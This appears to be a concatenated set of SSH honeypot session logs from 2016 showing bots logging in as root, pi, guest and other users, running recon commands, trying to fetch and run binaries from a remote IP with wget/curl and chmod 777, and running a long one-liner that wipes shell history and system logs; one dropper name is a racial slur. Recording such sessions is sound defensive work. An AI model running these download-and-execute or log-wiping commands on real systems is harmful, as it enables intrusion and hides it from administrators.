+syslog@svr04:~$ unset HISTFILE;unset HISTSAVE;history -n;export HISTFILE=/dev/null;rm -rf .bash_history;rm -rf /var/run/utmp;rm -rf /var/run/wtmp -;rm -rf /var/log/lastlog;rm -rf /usr/adm/lastlog;rm -rf .bash_history;cd /var/log/;rm -rf wtmp;rm -rf secure;rm -rf lastlog;rm -rf messages;touch messagess;touch wtmp;touch secure;touch lastlog;touch utmp;cd /root;rm -rf .bash_history;touch .bash_history;rm -rf /var/log/wtmp;rm -rf /var/log/messages;rm -rf /var/log/lastlog;rm -rf /var/log/secure;rm -rf /var/log/maillog;rm -rf /root/.bash_history;touch /root/.bash_history;ls -s /root/.bash_history /dev/null;touch /var/log/wtmp;touch /var/log/messages;touch /var/log/secure;touch /var/log/lastlog;touch /var/log/maillog;unset HISTFILE;unset HISTSAVE
+[4l[4h[4l[4h[4l    1  echo > /var/run/utmp;echo > /var/log/wtmp;echo > /var/log/lastlog;unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER
+    2  unset HISTFILE;unset HISTSAVE;history -n;export HISTFILE=/dev/null;rm -rf .bash_history;rm -rf /var/run/utmp;rm -rf /var/run/wtmp -;rm -rf /var/log/lastlog;rm -rf /usr/adm/lastlog;rm -rf .bash_history;cd /var/log/;rm -rf wtmp;rm -rf secure;rm -rf lastlog;rm -rf messages;touch messagess;touch wtmp;touch secure;touch lastlog;touch utmp;cd /root;rm -rf .bash_history;touch .bash_history;rm -rf /var/log/wtmp;rm -rf /var/log/messages;rm -rf /var/log/lastlog;rm -rf /var/log/secure;rm -rf /var/log/maillog;rm -rf /root/.bash_history;touch /root/.bash_history;ls -s /root/.bash_history /dev/null;touch /var/log/wtmp;touch /var/log/messages;touch /var/log/secure;touch /var/log/lastlog;touch /var/log/maillog;unset HISTFILE;unset HISTSAVE
+[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4lrm: cannot remove `/usr/adm/lastlog': No such file or directory
+[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4hsyslog@svr04:/root$ [4l__________________________________
+Processing ../log/tty/20160428-082010-6d0e04bf-0e.log file...
+--2016-04-28 08:20:10
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-090227-d6c1ec38-0e.log file...
+--2016-04-28 09:02:27
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-093901-7b2860c7-0e.log file...
+--2016-04-28 09:39:01
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-101917-b7ad3154-0e.log file...
+--2016-04-28 10:19:17
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-103824-d17ed6bd-0e.log file...
+--2016-04-28 10:38:24
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-110832-819043e2-0e.log file...
+--2016-04-28 11:08:32
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-112553-e74e1c86-0e.log file...
+--2016-04-28 11:25:53
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-114732-0988c38a-0e.log file...
+--2016-04-28 11:47:32
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-134506-265724b6-0e.log file...
+--2016-04-28 13:45:06
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-141348-a6733fb8-0e.log file...
+--2016-04-28 14:13:48
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-143625-a2783ed0-0e.log file...
+--2016-04-28 14:36:25
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-151431-5284a1cd-0e.log file...
+--2016-04-28 15:14:31
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-203242-49afbace-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# wget http://222.186.21.73:88/pz
+[4l--2016-04-28 20:32:42
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# chmod 777 pz
+[4lchmod: cannot access pz: No such file or directory
+[4hroot@svr04:~# ./pz
+bash: ./pz: command not found
+root@svr04:~# [4l__________________________________
+Processing ../log/tty/20160428-203739-af6dfdc4-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-28 20:37:39
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+--2016-04-28 20:37:39
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access x: No such file or directory
+chmod: cannot access nigger4: No such file or directory
+bash: ./nigger4: command not found
+__________________________________
+Processing ../log/tty/20160428-203909-b9fc54a1-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# curl http://222.186.21.73:88/pz -o /tmp/pz
+[4lDNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# chmod 777 /tmp/pz
+[4lchmod: cannot access /tmp/pz: No such file or directory
+[4hroot@svr04:~# /tmp/pz
+bash: /tmp/pz: command not found
+root@svr04:~# [4l__________________________________
+Processing ../log/tty/20160428-205302-ef14786f-0e.log file...
+--2016-04-28 20:53:02
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access gb.sh: No such file or directory
+bash: tftp: command not found
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160428-210333-8b63e808-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-28 21:03:33
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+--2016-04-28 21:03:33
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access x: No such file or directory
+chmod: cannot access nigger4: No such file or directory
+bash: ./nigger4: command not found
+__________________________________
+Processing ../log/tty/20160428-210334-8b63e808-0e.log file...
+__________________________________
+Processing ../log/tty/20160428-235508-780871fe-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hnagios@svr04:~$ __________________________________
+Processing ../log/tty/20160429-024742-8f6bebad-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hguest@svr04:~$ __________________________________
+Processing ../log/tty/20160429-025906-ca842f30-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4htest@svr04:~$ __________________________________
+Processing ../log/tty/20160429-071118-d06cd50d-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160429-071134-d06cd50d-1e.log file...
+Linux
+timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160429-071137-d06cd50d-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160429-071154-d06cd50d-3e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160429-071155-d06cd50d-4i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160429-071211-d06cd50d-5e.log file...
+ PID TTY      STAT    TIME COMMAND
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+__________________________________
+Processing ../log/tty/20160429-071212-d06cd50d-6i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160429-071228-d06cd50d-7e.log file...
+processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+__________________________________
+Processing ../log/tty/20160429-071230-d06cd50d-8i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160429-071246-d06cd50d-9e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160429-115713-eb180199-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hguest@svr04:~$ __________________________________
+Processing ../log/tty/20160429-144841-0525d677-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hsupport@svr04:~$ __________________________________
+Processing ../log/tty/20160429-215623-66abf48d-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hguest@svr04:~$ __________________________________
+Processing ../log/tty/20160429-235901-f754de55-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hadmin@svr04:~$ __________________________________
+Processing ../log/tty/20160430-012346-4d4ee4af-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
